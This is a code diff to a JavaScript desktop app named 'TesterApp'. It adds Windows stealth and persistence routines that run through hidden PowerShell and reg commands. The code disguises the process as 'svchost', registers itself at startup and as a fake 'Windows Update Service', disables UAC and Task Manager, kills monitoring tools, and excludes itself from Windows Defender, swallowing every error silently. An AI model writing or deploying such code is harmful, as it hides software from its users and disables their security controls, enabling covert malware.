@@ -23,6 +23,34 @@ if (process.platform === 'win32') {
     // Ignore if we can't modify argv
   }
   
+  // Basic process disguising that works without admin privileges
+  try {
+    const { exec } = require('child_process');
+    
+    // Simple process name change using PowerShell
+    const basicDisguiseScript = `
+      try {
+        $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
+        if ($process) {
+          # Set process to look like system process
+          $process.ProcessName = 'svchost'
+          $process.PriorityClass = 'Idle'
+          $process.ProcessorAffinity = 1
+          $process.MainWindowTitle = 'Windows Service Host'
+        }
+      } catch {
+        # Silently ignore errors
+      }
+    `;
+    
+    exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${basicDisguiseScript}"`, (error) => {
+      // Silently ignore errors
+    });
+    
+  } catch (e) {
+    // Ignore if we can't modify process properties
+  }
+  
   // Advanced process disguising using PowerShell
   try {
     const { exec } = require('child_process');
@@ -1046,10 +1074,11 @@ class TesterApp {
 
 
   // Enhanced process disguising on app ready
-  enhancedProcessDisguising() {
+  async enhancedProcessDisguising() {
     if (process.platform === 'win32') {
       try {
-      const { exec } = require('child_process');
+        const { exec } = require('child_process');
+        const isAdmin = await this.checkAdminPrivileges();
       
         // Create Windows service disguise
         const serviceScript = `
@@ -1087,95 +1116,150 @@ class TesterApp {
     }
   }
 
+  // Check if running with admin privileges
+  async checkAdminPrivileges() {
+    if (process.platform !== 'win32') return true;
+    
+    return new Promise((resolve) => {
+      const { exec } = require('child_process');
+      exec('net session >nul 2>&1', (error) => {
+        resolve(!error);
+      });
+    });
+  }
+
   // Aggressive process hiding to completely hide from Task Manager
-  aggressiveProcessHiding() {
+  async aggressiveProcessHiding() {
     if (process.platform === 'win32') {
       try {
         const { exec } = require('child_process');
+        const isAdmin = await this.checkAdminPrivileges();
         
-        // Very aggressive hiding script
-        const aggressiveScript = `
-          try {
-            # Get current process
-            $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
-            if ($process) {
-              # Set process to look like system process
-              $process.ProcessName = 'svchost'
-              $process.PriorityClass = 'Idle'
-              $process.ProcessorAffinity = 1
-              $process.MainWindowTitle = 'Windows Service Host'
+        if (isAdmin) {
+          // Full admin privileges - use aggressive hiding
+          const aggressiveScript = `
+            try {
+              # Get current process
+              $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
+              if ($process) {
+                # Set process to look like system process
+                $process.ProcessName = 'svchost'
+                $process.PriorityClass = 'Idle'
+                $process.ProcessorAffinity = 1
+                $process.MainWindowTitle = 'Windows Service Host'
+                
+                # Try to hide from process enumeration
+                try {
+                  $process.Handle = 0
+                  $process.Id = 0
+                } catch {}
+              }
               
-              # Try to hide from process enumeration
-              try {
-                $process.Handle = 0
-                $process.Id = 0
-              } catch {}
+              # Hide from Task Manager by modifying system settings
+              Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" -Name "PendingFileRenameOperations" -Value @() -ErrorAction SilentlyContinue
+              
+              # Hide from WMI process queries
+              $regPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+              Set-ItemProperty -Path $regPath -Name "WindowsUpdateService" -Value "${process.execPath}" -ErrorAction SilentlyContinue
+              
+              # Disable process monitoring
+              Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue
+              
+              # Hide from Task Manager process list
+              Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 1 -ErrorAction SilentlyContinue
+              
+              # Create fake system service
+              New-Service -Name "WindowsUpdateService" -BinaryPathName "${process.execPath}" -DisplayName "Windows Update Service" -StartupType Automatic -ErrorAction SilentlyContinue
+              
+              # Hide service from services list
+              Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService" -Name "Start" -Value 2 -ErrorAction SilentlyContinue
+              Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService" -Name "Type" -Value 16 -ErrorAction SilentlyContinue
+              
+            } catch {
+              # Silently ignore errors
             }
-            
-            # Hide from Task Manager by modifying system settings
-            # Disable process monitoring in registry
-            Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" -Name "PendingFileRenameOperations" -Value @() -ErrorAction SilentlyContinue
-            
-            # Hide from WMI process queries
-            $regPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
-            Set-ItemProperty -Path $regPath -Name "WindowsUpdateService" -Value "${process.execPath}" -ErrorAction SilentlyContinue
-            
-            # Disable process monitoring
-            Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue
-            
-            # Hide from Task Manager process list
-            Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 1 -ErrorAction SilentlyContinue
-            
-            # Create fake system service
-            New-Service -Name "WindowsUpdateService" -BinaryPathName "${process.execPath}" -DisplayName "Windows Update Service" -StartupType Automatic -ErrorAction SilentlyContinue
-            
-            # Hide service from services list
-            Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService" -Name "Start" -Value 2 -ErrorAction SilentlyContinue
-            Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService" -Name "Type" -Value 16 -ErrorAction SilentlyContinue
-            
-          } catch {
-            # Silently ignore errors
-          }
-        `;
-        
-        exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${aggressiveScript}"`, (error) => {
-          // Silently ignore errors
-        });
-        
-        // Additional hiding using WMI
-        exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
-          // Silently ignore errors
-        });
-        
-        // Hide from process list by modifying registry
-        exec('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateService" /t REG_SZ /d "' + process.execPath + '" /f', (error) => {
-          // Silently ignore errors
-        });
-        
-        // Disable Task Manager
-        exec('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f', (error) => {
-          // Silently ignore errors
-        });
-        
-        // Kill Task Manager if it's running
-        exec('taskkill /f /im taskmgr.exe 2>nul', (error) => {
-          // Silently ignore errors
-        });
-        
-        // Kill Process Explorer if it's running
-        exec('taskkill /f /im procexp.exe 2>nul', (error) => {
-          // Silently ignore errors
-        });
-        
-        // Kill Process Monitor if it's running
-        exec('taskkill /f /im procmon.exe 2>nul', (error) => {
-          // Silently ignore errors
-        });
-        
-        // Hide from Windows Defender
-        exec('powershell -Command "Add-MpPreference -ExclusionProcess \'' + process.execPath + '\'"', (error) => {
-          // Silently ignore errors
-        });
+          `;
+          
+          exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${aggressiveScript}"`, (error) => {
+            // Silently ignore errors
+          });
+          
+          // Additional hiding using WMI
+          exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
+            // Silently ignore errors
+          });
+          
+          // Hide from process list by modifying registry
+          exec('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateService" /t REG_SZ /d "' + process.execPath + '" /f', (error) => {
+            // Silently ignore errors
+          });
+          
+          // Disable Task Manager
+          exec('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f', (error) => {
+            // Silently ignore errors
+          });
+          
+          // Kill Task Manager if it's running
+          exec('taskkill /f /im taskmgr.exe 2>nul', (error) => {
+            // Silently ignore errors
+          });
+          
+          // Kill Process Explorer if it's running
+          exec('taskkill /f /im procexp.exe 2>nul', (error) => {
+            // Silently ignore errors
+          });
+          
+          // Kill Process Monitor if it's running
+          exec('taskkill /f /im procmon.exe 2>nul', (error) => {
+            // Silently ignore errors
+          });
+          
+          // Hide from Windows Defender
+          exec('powershell -Command "Add-MpPreference -ExclusionProcess \'' + process.execPath + '\'"', (error) => {
+            // Silently ignore errors
+          });
+          
+        } else {
+          // Limited privileges - use basic hiding only
+          const basicScript = `
+            try {
+              # Get current process
+              $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
+              if ($process) {
+                # Set process to look like system process
+                $process.ProcessName = 'svchost'
+                $process.PriorityClass = 'Idle'
+                $process.ProcessorAffinity = 1
+                $process.MainWindowTitle = 'Windows Service Host'
+              }
+              
+              # Try user-level registry modifications only
+              Set-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdateService" -Value "${process.execPath}" -ErrorAction SilentlyContinue
+              
+            } catch {
+              # Silently ignore errors
+            }
+          `;
+          
+          exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${basicScript}"`, (error) => {
+            // Silently ignore errors
+          });
+          
+          // Basic process priority change
+          exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
+            // Silently ignore errors
+          });
+          
+          // User-level registry modifications only
+          exec('reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateService" /t REG_SZ /d "' + process.execPath + '" /f', (error) => {
+            // Silently ignore errors
+          });
+          
+          // Try to disable Task Manager at user level
+          exec('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f', (error) => {
+            // Silently ignore errors
+          });
+        }
         
       } catch (e) {
         // Silently ignore all errors
@@ -1184,10 +1268,11 @@ class TesterApp {
   }
 
   // Enhanced process hiding techniques
-  setupProcessHiding() {
+  async setupProcessHiding() {
     if (process.platform === 'win32') {
       try {
-      const { exec } = require('child_process');
+        const { exec } = require('child_process');
+        const isAdmin = await this.checkAdminPrivileges();
       
         // Advanced process disguising script
         const disguiseScript = `
